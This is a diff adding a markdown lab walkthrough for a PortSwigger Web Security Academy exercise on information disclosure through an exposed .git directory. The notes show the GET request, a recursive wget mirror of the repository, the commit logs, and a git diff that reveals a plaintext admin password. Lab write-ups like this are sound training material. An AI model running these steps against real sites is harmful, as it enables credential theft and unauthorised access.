@@ -223,3 +223,127 @@ GET /admin/delete?username=carlos HTTP/2
 ```
 
 BOOM
+
+# 5 Lab: [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
+
+This lab _discloses sensitive information_ via its **version control history => GIT**. To solve the lab, obtain the _password_ for the _administrator user_ then log in and _delete_ the user carlos.
+
+send:
+
+```php
+GET /.git HTTP/2
+```
+
+response:
+
+```txt
+HTTP/2 200 OK
+```
+
+and URL:
+
+```url
+https://0a4d006804ed4da081942fb8008000cc.web-security-academy.net/.git
+
+```
+
+Index of/.git
+**HEAD**: This file points to the last commit in the currently checked-out branch. It indicates the current position in the version history.
+
+1. co to HEAD ref: refs/heads/master
+
+```html
+<refs>
+	=>
+	<heads>
+		=> master 41B => 8caa6742d4b475c62ce939636323eb871047db55</heads
+	></refs
+>
+Remove admin password from config
+```
+
+_branches_: This directory contains information about various branches in your Git repository. Each branch is represented by a separate file or directory.
+
+_description_: This file contains a short, human-readable description of the Git repository. It is often used by hosting services to provide additional information about the repository.
+
+_hooks_: This directory contains scripts that can be executed on specific Git events, such as pre-commit or post-merge. These scripts allow you to customize and automate various aspects of your workflow.
+
+_info_: This directory contains global information and configurations related to the Git repository. This may include exclusion patterns for ignored files and other repository-specific settings.
+
+_refs_: This directory contains references to various objects in your Git repository, such as branches and tags. It is a crucial part of Git's mechanism for tracking the project's history.
+
+_HEAD_: This file points to the last commit in the currently checked-out branch. It indicates the current position in the version history.
+
+_config_: This file stores configuration settings for the Git repository, such as user information and default branch names.
+
+_objects_: This directory stores all Git objects, including blobs (file content), trees (directory structures), commits, and tags. This is where the actual data of your project is stored.
+
+_index_: This file is the staging area for changes to be committed. It tracks files and changes that will be included in the next commit.
+
+**COMMIT_EDITMSG**: This file contains the default commit message presented to you when creating a new commit. You can edit this message before finalizing the commit.
+
+2. current - branch (main):
+   8caa6742d4b475c62ce939636323eb871047db55
+   COMMIT_EDITMSG: "Remove admin password from config"
+
+**logs**: This directory contains log files that document changes in the repository, including **commit history and ref changes**.
+
+     _second_ commit: Remove admin password from config
+
+```
+6008d7c9dcff135dee1dc7e06bf26f77eca774a6
+8caa6742d4b475c62ce939636323eb871047db55
+Carlos Montoya <carlos@carlos-montoya.net>
+1707211286 +0000
+commit: Remove admin password from config
+```
+
+2. early commit - branch admin password inclusion!
+   logs: This directory contains log files that document changes in the repository, including commit history and ref changes.
+
+_commit first commit -m_
+
+```
+0000000000000000000000000000000000000000
+6008d7c9dcff135dee1dc7e06bf26f77eca774a6
+Carlos Montoya <carlos@carlos-montoya.net>
+1707211286 +0000
+commit (initial): Add skeleton admin panel
+```
+
+3. go to PowerShell and send
+
+```url
+.\wget.exe
+```
+
+```url
+Downloads> ./wget.exe -r https://0a4d006804ed4da081942fb8008000cc.web-security-academy.net/.git/
+```
+
+**the action save .git directory my local disc in Downloads**
+
+cd https://0a4d006804ed4da081942fb8008000cc.web-security-academy.net/.git/
+\Downloads\0a4d006804ed4da081942fb8008000cc.web-security-academy.net\.git>
+
+enter: => git diff 6008d7c9dcff135dee1dc7e06bf26f77eca774a6 8caa6742d4b475c62ce939636323eb871047db55
+
+**git diff** for
+to _compare_ two keys
+
+_git diff_ **6008d7c9dcff135dee1dc7e06bf26f77eca774a6**
+<---> **8caa6742d4b475c62ce939636323eb871047db55**
+
+and display the difference between them: =>
+
+```php
+diff --git a/admin.conf b/admin.conf
+index 866bc66..21d23f1 100644
+--- a/admin.conf
++++ b/admin.conf
+@@ -1 +1 @@
+-ADMIN_PASSWORD=0jrtqz0ggpr2vff0ixj1
++ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+```
+
+BOOM
